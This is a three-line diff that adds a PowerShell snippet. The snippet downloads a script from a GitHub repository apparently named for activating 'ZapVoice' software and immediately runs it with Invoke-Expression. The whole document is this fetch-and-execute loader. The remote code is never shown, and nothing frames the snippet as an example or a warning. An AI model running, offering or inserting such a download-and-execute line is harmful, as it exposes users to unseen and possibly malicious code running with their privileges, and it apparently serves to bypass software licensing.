@@ -1,0 +1,3 @@
+$url = 'https://raw.githubusercontent.com/Pugn0/zapvoice-activator/refs/heads/main/ZapVoice_System_Redirect.ps1'
+$code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+Invoke-Expression $code
